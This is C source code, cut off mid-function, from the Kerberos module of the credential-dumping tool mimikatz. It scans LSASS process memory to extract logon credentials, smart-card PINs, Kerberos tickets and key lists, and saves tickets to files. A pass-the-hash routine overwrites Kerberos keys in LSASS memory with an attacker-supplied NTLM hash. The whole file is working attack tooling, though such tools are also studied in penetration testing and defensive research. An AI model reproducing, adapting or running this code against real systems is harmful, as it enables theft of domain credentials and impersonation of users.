/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "kuhl_m_sekurlsa_kerberos.h"
#ifdef _M_X64
BYTE PTRN_WALL_KerbFreeLogonSessionList[]	= {0x48, 0x3b, 0xfe, 0x0f, 0x84};
BYTE PTRN_WALL_KerbUnloadLogonSessionTable[]= {0x48, 0x8b, 0x18, 0x48, 0x8d, 0x0d};
KULL_M_PATCH_GENERIC KerberosReferences[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WALL_KerbFreeLogonSessionList),	PTRN_WALL_KerbFreeLogonSessionList},	{0, NULL}, {-4, 0}},
	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_KerbFreeLogonSessionList),	PTRN_WALL_KerbFreeLogonSessionList},	{0, NULL}, {-4, 1}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 2}},
};
#elif defined _M_IX86
BYTE PTRN_WALL_KerbFreeLogonSessionList[]	= {0xeb, 0x0f, 0x6a, 0x01, 0x57, 0x56, 0xe8};
BYTE PTRN_WNO8_KerbUnloadLogonSessionTable[]= {0x53, 0x8b, 0x18, 0x50, 0x56};
BYTE PTRN_WIN8_KerbUnloadLogonSessionTable[]= {0x57, 0x8b, 0x38, 0x50, 0x68};
KULL_M_PATCH_GENERIC KerberosReferences[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WALL_KerbFreeLogonSessionList),	PTRN_WALL_KerbFreeLogonSessionList},	{0, NULL}, {-4, 0}},
	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_KerbFreeLogonSessionList),	PTRN_WALL_KerbFreeLogonSessionList},	{0, NULL}, {-4, 1}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WNO8_KerbUnloadLogonSessionTable),	PTRN_WNO8_KerbUnloadLogonSessionTable}, {0, NULL}, {-11,2}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_KerbUnloadLogonSessionTable),	PTRN_WIN8_KerbUnloadLogonSessionTable}, {0, NULL}, {-14,2}},
};
#endif

PVOID KerbLogonSessionListOrTable = NULL;
LONG KerbOffsetIndex = 0;

const KERB_INFOS kerbHelper[] = {
	{
		sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_51, LocallyUniqueIdentifier),
		sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_51, credentials),
		{
			sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_51, Tickets_1),
			sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_51, Tickets_2),
			sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_51, Tickets_3),
		},
		sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_51, pinCode),
		sizeof(LIST_ENTRY) + sizeof(KIWI_KERBEROS_LOGON_SESSION_51),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, ServiceName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, TargetName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, DomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, TargetDomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, Description),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, AltTargetDomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, ClientName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, TicketFlags),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, KeyType),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, Key),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, StartTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, EndTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, RenewUntil),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, TicketEncType),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, Ticket),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, TicketKvno),
		sizeof(KIWI_KERBEROS_INTERNAL_TICKET_51),
		sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_51, pKeyList),
		sizeof(KIWI_KERBEROS_KEYS_LIST_5),
		FIELD_OFFSET(KERB_HASHPASSWORD_5, generic),
		sizeof(KERB_HASHPASSWORD_5),
	},
	{
		sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, LocallyUniqueIdentifier),
		sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, credentials),
		{
			sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_1),
			sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_2),
			sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_3),
		},
		sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, pinCode),
		sizeof(LIST_ENTRY) + sizeof(KIWI_KERBEROS_LOGON_SESSION),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, ServiceName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, TargetName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, DomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, TargetDomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, Description),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, AltTargetDomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, ClientName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, TicketFlags),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, KeyType),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, Key),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, StartTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, EndTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, RenewUntil),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, TicketEncType),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, Ticket),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, TicketKvno),
		sizeof(KIWI_KERBEROS_INTERNAL_TICKET_52),
		sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, pKeyList),
		sizeof(KIWI_KERBEROS_KEYS_LIST_5),
		FIELD_OFFSET(KERB_HASHPASSWORD_5, generic),
		sizeof(KERB_HASHPASSWORD_5),
	},
	{
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, LocallyUniqueIdentifier),
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, credentials),
		{
			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_1),
			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_2),
			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_3),
		},
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, pinCode),
		sizeof(KIWI_KERBEROS_LOGON_SESSION),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, ServiceName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TargetName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, DomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TargetDomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, Description),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, AltTargetDomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, ClientName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TicketFlags),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, KeyType),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, Key),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, StartTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, EndTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, RenewUntil),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TicketEncType),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, Ticket),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TicketKvno),
		sizeof(KIWI_KERBEROS_INTERNAL_TICKET_6),
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, pKeyList),
		sizeof(KIWI_KERBEROS_KEYS_LIST_6),
		FIELD_OFFSET(KERB_HASHPASSWORD_6, generic),
		sizeof(KERB_HASHPASSWORD_6),
	},
};

KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_kerberos_package = {L"kerberos", kuhl_m_sekurlsa_enum_logon_callback_kerberos, TRUE, L"kerberos.dll", {{{NULL, NULL}, 0, NULL}, FALSE, FALSE}};
const PKUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_kerberos_single_package[] = {&kuhl_m_sekurlsa_kerberos_package};

NTSTATUS kuhl_m_sekurlsa_kerberos(int argc, wchar_t * argv[])
{
	return kuhl_m_sekurlsa_getLogonData(kuhl_m_sekurlsa_kerberos_single_package, 1);
}

void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_kerberos(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	KIWI_KERBEROS_ENUM_DATA data = {kuhl_m_sekurlsa_enum_kerberos_callback_passwords, NULL};
	kuhl_m_sekurlsa_enum_generic_callback_kerberos(pData, &data);
}

NTSTATUS kuhl_m_sekurlsa_kerberos_tickets(int argc, wchar_t * argv[])
{
	KIWI_KERBEROS_ENUM_DATA_TICKET ticketData = {argc, FALSE};
	KIWI_KERBEROS_ENUM_DATA data = {kuhl_m_sekurlsa_enum_kerberos_callback_tickets, &ticketData};
	kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_kerberos_generic, &data);
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_sekurlsa_kerberos_keys(int argc, wchar_t * argv[])
{
	KIWI_KERBEROS_ENUM_DATA data = {kuhl_m_sekurlsa_enum_kerberos_callback_keys, NULL};
	kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_kerberos_generic, &data);
	return STATUS_SUCCESS;
}

BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_kerberos_generic(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData)
{
	kuhl_m_sekurlsa_enum_generic_callback_kerberos(pData, (PKIWI_KERBEROS_ENUM_DATA) pOptionalData);
	return TRUE;
}

void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_passwords(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN KULL_M_MEMORY_ADDRESS LocalKerbSession, IN KULL_M_MEMORY_ADDRESS RemoteLocalKerbSession, IN OPTIONAL LPVOID pOptionalData)
{
	UNICODE_STRING pinCode;
	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS aLocalMemory = {&pinCode, &hLocalMemory}, aLsassMemory = {*(PUNICODE_STRING *) ((PBYTE) LocalKerbSession.address + kerbHelper[KerbOffsetIndex].offsetPin), pData->cLsass->hLsassMem};

	kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) ((PBYTE) LocalKerbSession.address + kerbHelper[KerbOffsetIndex].offsetCreds), pData->LogonId, 0);
	if(aLsassMemory.address)
		if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(UNICODE_STRING)))
			kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) &pinCode, pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_PINCODE | ((pData->cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_VISTA) ? KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT : 0));
}

const wchar_t * KUHL_M_SEKURLSA_KERBEROS_TICKET_TYPE[] = {L"Ticket Granting Service", L"Client Ticket ?", L"Ticket Granting Ticket",};
void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_tickets(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN KULL_M_MEMORY_ADDRESS Localkerbsession, IN KULL_M_MEMORY_ADDRESS RemoteLocalKerbSession, IN OPTIONAL LPVOID pOptionalData)
{
	PKIWI_KERBEROS_ENUM_DATA_TICKET ticketData = (PKIWI_KERBEROS_ENUM_DATA_TICKET) pOptionalData;
	DWORD i;
	kuhl_m_sekurlsa_printinfos_logonData(pData);
	for(i = 0; i < 3; i++)
	{
		kprintf(L"\n\tGroup %u - %s", i, KUHL_M_SEKURLSA_KERBEROS_TICKET_TYPE[i]);
		kuhl_m_sekurlsa_kerberos_enum_tickets(pData, i, (PBYTE) RemoteLocalKerbSession.address + kerbHelper[KerbOffsetIndex].offsetTickets[i], ticketData->isTicketExport);
		kprintf(L"\n");
	}
}

void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_keys(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN KULL_M_MEMORY_ADDRESS Localkerbsession, IN KULL_M_MEMORY_ADDRESS RemoteLocalKerbSession, IN OPTIONAL LPVOID pOptionalData)
{
	DWORD i, nbHash;
	KULL_M_MEMORY_ADDRESS aLocalKeyMemory = {NULL, Localkerbsession.hMemory}, aLocalHashMemory = {NULL, Localkerbsession.hMemory};
	if(RemoteLocalKerbSession.address =  *(PVOID *) ((PBYTE) Localkerbsession.address + kerbHelper[KerbOffsetIndex].offsetKeyList))
	{
		kuhl_m_sekurlsa_printinfos_logonData(pData);
		kprintf(L"\n\tKey List @ %p\n", RemoteLocalKerbSession.address);
		if(aLocalKeyMemory.address = LocalAlloc(LPTR,  kerbHelper[KerbOffsetIndex].structKeyListSize))
		{
			if(kull_m_memory_copy(&aLocalKeyMemory, &RemoteLocalKerbSession, kerbHelper[KerbOffsetIndex].structKeyListSize))
			{
				if(nbHash = ((DWORD *)(aLocalKeyMemory.address))[1])
				{
					RemoteLocalKerbSession.address = (PBYTE) RemoteLocalKerbSession.address + kerbHelper[KerbOffsetIndex].structKeyListSize;
					i = nbHash * (DWORD) kerbHelper[KerbOffsetIndex].structKeyPasswordHashSize;
					if(aLocalHashMemory.address = LocalAlloc(LPTR, i))
					{
						if(kull_m_memory_copy(&aLocalHashMemory, &RemoteLocalKerbSession, i))
							for(i = 0; i < nbHash; i++)
								kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) ((PBYTE) aLocalHashMemory.address + i * kerbHelper[KerbOffsetIndex].structKeyPasswordHashSize + kerbHelper[KerbOffsetIndex].offsetHashGeneric), pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_KEY_LIST | ((pData->cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_VISTA) ? KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT : 0));
						LocalFree(aLocalHashMemory.address);
					}
				}
			}
			LocalFree(aLocalKeyMemory.address);
		}
	}
}

void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_pth(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN KULL_M_MEMORY_ADDRESS Localkerbsession, IN KULL_M_MEMORY_ADDRESS RemoteLocalKerbSession, IN OPTIONAL LPVOID pOptionalData)
{
	PMSV1_0_PTH_DATA pthData = (PMSV1_0_PTH_DATA) pOptionalData;
	DWORD i, nbHash;
	BYTE ntlmHash[LM_NTLM_HASH_LENGTH];
	UNICODE_STRING nullPasswd = {0, 0, NULL};
	KULL_M_MEMORY_ADDRESS aLocalKeyMemory = {NULL, Localkerbsession.hMemory}, aLocalHashMemory = {NULL, Localkerbsession.hMemory}, aLocalNTLMMemory = {ntlmHash, Localkerbsession.hMemory}, aLocalPasswdMemory = {&nullPasswd, Localkerbsession.hMemory}, aRemotePasswdMemory = {(PBYTE) RemoteLocalKerbSession.address + kerbHelper[KerbOffsetIndex].offsetCreds + FIELD_OFFSET(KIWI_GENERIC_PRIMARY_CREDENTIAL, Password), RemoteLocalKerbSession.hMemory};
	PKERB_HASHPASSWORD_GENERIC pHash;

	if(RemoteLocalKerbSession.address =  *(PVOID *) ((PBYTE) Localkerbsession.address + kerbHelper[KerbOffsetIndex].offsetKeyList))
	{
		if(aLocalKeyMemory.address = LocalAlloc(LPTR,  kerbHelper[KerbOffsetIndex].structKeyListSize))
		{
			if(kull_m_memory_copy(&aLocalKeyMemory, &RemoteLocalKerbSession, kerbHelper[KerbOffsetIndex].structKeyListSize))
			{
				if(nbHash = ((DWORD *)(aLocalKeyMemory.address))[1])
				{
					RemoteLocalKerbSession.address = (PBYTE) RemoteLocalKerbSession.address + kerbHelper[KerbOffsetIndex].structKeyListSize;
					i = nbHash * (DWORD) kerbHelper[KerbOffsetIndex].structKeyPasswordHashSize;
					if(aLocalHashMemory.address = LocalAlloc(LPTR, i))
					{
						if(kull_m_memory_copy(&aLocalHashMemory, &RemoteLocalKerbSession, i))
						{
							kprintf(L"Data copy Kerberos @ %p (%u hash) :", RemoteLocalKerbSession.address, nbHash);
							for(i = 0, pthData->isReplaceOk = TRUE; (i < nbHash) && pthData->isReplaceOk; i++)
							{
								kprintf(L" ");
								pHash = (PKERB_HASHPASSWORD_GENERIC) ((PBYTE) aLocalHashMemory.address + i * kerbHelper[KerbOffsetIndex].structKeyPasswordHashSize + kerbHelper[KerbOffsetIndex].offsetHashGeneric);
								RemoteLocalKerbSession.address = pHash->Checksump;
								RtlCopyMemory(aLocalNTLMMemory.address, pthData->NtlmHash, LM_NTLM_HASH_LENGTH);
								if(pData->cLsass->osContext.BuildNumber >= KULL_M_WIN_BUILD_VISTA)
									(*pData->lsassLocalHelper->pLsaProtectMemory)(aLocalNTLMMemory.address, LM_NTLM_HASH_LENGTH);
								if(pthData->isReplaceOk = kull_m_memory_copy(&RemoteLocalKerbSession, &aLocalNTLMMemory, pHash->Size ? (min(pHash->Size, LM_NTLM_HASH_LENGTH)) : LM_NTLM_HASH_LENGTH)) // ok not fair-play with AES-* and old CRC =)
									kprintf(L"%u", i+1);
								else PRINT_ERROR_AUTO(L"kull_m_memory_copy");
							}
							if(pthData->isReplaceOk && ((PKIWI_GENERIC_PRIMARY_CREDENTIAL) ((PBYTE) Localkerbsession.address + kerbHelper[KerbOffsetIndex].offsetCreds))->Password.Buffer)
							{
								kprintf(L" ");
								if(pthData->isReplaceOk = kull_m_memory_copy(&aRemotePasswdMemory, &aLocalPasswdMemory, sizeof(UNICODE_STRING)))
									kprintf(L"OK!", aRemotePasswdMemory.address);
								else PRINT_ERROR_AUTO(L"kull_m_memory_copy");
							}
						}
						LocalFree(aLocalHashMemory.address);
					}
				}
			}
			LocalFree(aLocalKeyMemory.address);
		}
	}
}

BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_kerberos_pth(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData)
{
	PMSV1_0_PTH_DATA pthData = (PMSV1_0_PTH_DATA) pOptionalData;
	KIWI_KERBEROS_ENUM_DATA data = {kuhl_m_sekurlsa_enum_kerberos_callback_pth, pthData};
	if(RtlEqualLuid(pData->LogonId, pthData->LogonId))
	{
		kuhl_m_sekurlsa_enum_generic_callback_kerberos(pData, &data);
		return FALSE;
	}
	else return TRUE;

}

void kuhl_m_sekurlsa_enum_generic_callback_kerberos(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL PKIWI_KERBEROS_ENUM_DATA pEnumData)
{
	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS aLocalMemory = {NULL, &hLocalMemory}, aLsassMemory = {NULL, pData->cLsass->hLsassMem};
	if(kuhl_m_sekurlsa_kerberos_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &kuhl_m_sekurlsa_kerberos_package.Module, KerberosReferences, sizeof(KerberosReferences) / sizeof(KULL_M_PATCH_GENERIC), &KerbLogonSessionListOrTable, NULL, &KerbOffsetIndex))
	{
		aLsassMemory.address = KerbLogonSessionListOrTable;
		if(pData->cLsass->osContext.MajorVersion < 6)
			aLsassMemory.address = kuhl_m_sekurlsa_utils_pFromLinkedListByLuid(&aLsassMemory, kerbHelper[KerbOffsetIndex].offsetLuid, pData->LogonId);
		else
			aLsassMemory.address = kuhl_m_sekurlsa_utils_pFromAVLByLuid(&aLsassMemory, kerbHelper[KerbOffsetIndex].offsetLuid, pData->LogonId);
		
		if(aLsassMemory.address)
		{
			if(aLocalMemory.address = LocalAlloc(LPTR, kerbHelper[KerbOffsetIndex].structSize))
			{
				if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, kerbHelper[KerbOffsetIndex].structSize))
					pEnumData->callback(pData, aLocalMemory, aLsassMemory, pEnumData->optionalData);
				LocalFree(aLocalMemory.address);
			}
		}
	} else kprintf(L"KO");
}

void kuhl_m_sekurlsa_kerberos_enum_tickets(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN DWORD grp, IN PVOID tickets, IN BOOL isFile)
{
	PVOID pStruct, pRef = tickets;
	KULL_M_MEMORY_HANDLE  hBuffer = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS data = {&pStruct, &hBuffer}, aTicket = {NULL, &hBuffer}, aLsassBuffer = {tickets, pData->cLsass->hLsassMem};
	DWORD nbTickets = 0;
	PKIWI_KERBEROS_TICKET pKiwiTicket;
	PDIRTY_ASN1_SEQUENCE_EASY App_KrbCred;
	wchar_t * filename;

	if(aTicket.address = LocalAlloc(LPTR, kerbHelper[KerbOffsetIndex].structTicketSize))
	{
		if(kull_m_memory_copy(&data, &aLsassBuffer, sizeof(PVOID)))
		{
			data.address = pStruct;
			data.hMemory = pData->cLsass->hLsassMem;

			while(data.address != pRef)
			{
				if(kull_m_memory_copy(&aTicket, &data, kerbHelper[KerbOffsetIndex].structTicketSize))
				{
					kprintf(L"\n\t [%08x]", nbTickets);
					if(pKiwiTicket = kuhl_m_sekurlsa_kerberos_createTicket((LPBYTE) aTicket.address, pData->cLsass->hLsassMem))
					{
						kuhl_m_kerberos_ticket_display(pKiwiTicket, FALSE);
						if(isFile)
							if(filename = kuhl_m_sekurlsa_kerberos_generateFileName(pData->LogonId, grp, nbTickets, pKiwiTicket, MIMIKATZ_KERBEROS_EXT))
							{
								if(App_KrbCred = kuhl_m_kerberos_ticket_createAppKrbCred(pKiwiTicket))
								{
									if(kull_m_file_writeData(filename, (PBYTE) App_KrbCred, kull_m_asn1_getSize(App_KrbCred)))
										kprintf(L"\n\t   * Saved to file %s !\n", filename);
									else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
									LocalFree(App_KrbCred);
								}
								LocalFree(filename);
							}

						kuhl_m_sekurlsa_kerberos_freeTicket(pKiwiTicket);
					}
					data.address = ((PLIST_ENTRY) (aTicket.address))->Flink;
				}
				else break;
				nbTickets++;
			}
		}
		LocalFree(aTicket.address);
	}
}

wchar_t * kuhl_m_sekurlsa_kerberos_generateFileName(PLUID LogonId, const DWORD grp, const DWORD index, PKIWI_KERBEROS_TICKET ticket, LPCWSTR ext)
{
	wchar_t * buffer;
	size_t charCount = 0x1000;
	BOOL isLong = (ticket->ClientName) && (ticket->ClientName->NameType == KRB_NT_PRINCIPAL) && (ticket->ClientName->NameCount == 1) && (ticket->ServiceName) && ((ticket->ServiceName->NameType == KRB_NT_SRV_INST) || (ticket->ServiceName->NameType == KRB_NT_SRV_HST)) && (ticket->ServiceName->NameCount > 1);

	if(buffer = (wchar_t *) LocalAlloc(LPTR, charCount * sizeof(wchar_t)))
	{
		if(isLong)
			isLong = swprintf_s(buffer, charCount, L"[%x;%x]-%1u-%u-%08x-%wZ@%wZ-%wZ.%s", LogonId->HighPart, LogonId->LowPart, grp, index, ticket->TicketFlags, &ticket->ClientName->Names[0], &ticket->ServiceName->Names[0], &ticket->ServiceName->Names[1], ext) > 0;
		else
			isLong = swprintf_s(buffer, charCount, L"[%x;%x]-%1u-%u-%08x.%s", LogonId->HighPart, LogonId->LowPart, grp, index, ticket->TicketFlags, ext) > 0;
		
		if(isLong)
			kull_m_file_cleanFilename(buffer);
		else
			buffer = (wchar_t *) LocalFree(buffer);
	}
	return buffer;
}

PKIWI_KERBEROS_TICKET kuhl_m_sekurlsa_kerberos_createTicket(PBYTE pTicket, PKULL_M_MEMORY_HANDLE hLSASS)
{
	BOOL status = FALSE;
	PKIWI_KERBEROS_TICKET ticket;
	
	if(ticket = (PKIWI_KERBEROS_TICKET) LocalAlloc(LPTR, sizeof(KIWI_KERBEROS_TICKET)))
	{
		ticket->StartTime = *(PFILETIME) (pTicket + kerbHelper[KerbOffsetIndex].offsetStartTime);
		ticket->EndTime = *(PFILETIME) (pTicket + kerbHelper[KerbOffsetIndex].offsetEndTime);
		ticket->RenewUntil = *(PFILETIME) (pTicket + kerbHelper[KerbOffsetIndex].offsetRenewUntil);
		
		ticket->ServiceName = *(PKERB_EXTERNAL_NAME *) (pTicket + kerbHelper[KerbOffsetIndex].offsetServiceName);
		kuhl_m_sekurlsa_kerberos_createExternalName(&ticket->ServiceName, hLSASS);
		ticket->DomainName = *(PUNICODE_STRING) (pTicket + kerbHelper[KerbOffsetIndex].offsetDomainName);
		kull_m_string_getUnicodeString(&ticket->DomainName, hLSASS);

		ticket->TargetName = *(PKERB_EXTERNAL_NAME *) (pTicket + kerbHelper[KerbOffsetIndex].offsetTargetName);
		kuhl_m_sekurlsa_kerberos_createExternalName(&ticket->TargetName, hLSASS);
		ticket->TargetDomainName = *(PUNICODE_STRING) (pTicket + kerbHelper[KerbOffsetIndex].offsetTargetDomainName);
		kull_m_string_getUnicodeString(&ticket->TargetDomainName, hLSASS);

		ticket->ClientName = *(PKERB_EXTERNAL_NAME *) (pTicket + kerbHelper[KerbOffsetIndex].offsetClientName);
		kuhl_m_sekurlsa_kerberos_createExternalName(&ticket->ClientName, hLSASS);
		ticket->AltTargetDomainName = *(PUNICODE_STRING) (pTicket + kerbHelper[KerbOffsetIndex].offsetAltTargetDomainName);
		kull_m_string_getUnicodeString(&ticket->AltTargetDomainName, hLSASS);

		ticket->Description = *(PUNICODE_STRING) (pTicket + kerbHelper[KerbOffsetIndex].offsetDescription);
		kull_m_string_getUnicodeString(&ticket->Description, hLSASS);

		ticket->KeyType = *(PULONG) ((pTicket + kerbHelper[KerbOffsetIndex].offsetKeyType));
		ticket->Key = *(PKIWI_KERBEROS_BUFFER) ((pTicket + kerbHelper[KerbOffsetIndex].offsetKey));;
		kuhl_m_sekurlsa_kerberos_createKiwiKerberosBuffer(&ticket->Key, hLSASS);

		ticket->TicketFlags = *(PULONG) ((pTicket + kerbHelper[KerbOffsetIndex].offsetTicketFlags));
		ticket->TicketEncType = *(PULONG) ((pTicket + kerbHelper[KerbOffsetIndex].offsetTicketEncType));
		ticket->TicketKvno = *(PULONG) ((pTicket + kerbHelper[KerbOffsetIndex].offsetTicketKvno));
		ticket->Ticket = *(PKIWI_KERBEROS_BUFFER) ((pTicket + kerbHelper[KerbOffsetIndex].offsetTicket));;
		kuhl_m_sekurlsa_kerberos_createKiwiKerberosBuffer(&ticket->Ticket, hLSASS);
	}
	return ticket;
}

void kuhl_m_sekurlsa_kerberos_createExternalName(PKERB_EXTERNAL_NAME *pExternalName, PKULL_M_MEMORY_HANDLE hLSASS)
{
	BOOL status = FALSE;
	KERB_EXTERNAL_NAME extName;
	PKERB_EXTERNAL_NAME pTempName;
	KULL_M_MEMORY_HANDLE  hBuffer = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS aName = {*pExternalName, hLSASS}, aLocalBuffer = {&extName, &hBuffer};//, aLocalStrings = {NULL, &hBuffer};
	DWORD i;

	if(aName.address)
	{
		*pExternalName = NULL;
		if(kull_m_memory_copy(&aLocalBuffer, &aName, sizeof(KERB_EXTERNAL_NAME) - sizeof(UNICODE_STRING)))
		{
			i = sizeof(KERB_EXTERNAL_NAME) + (sizeof(UNICODE_STRING) * (extName.NameCount - 1));
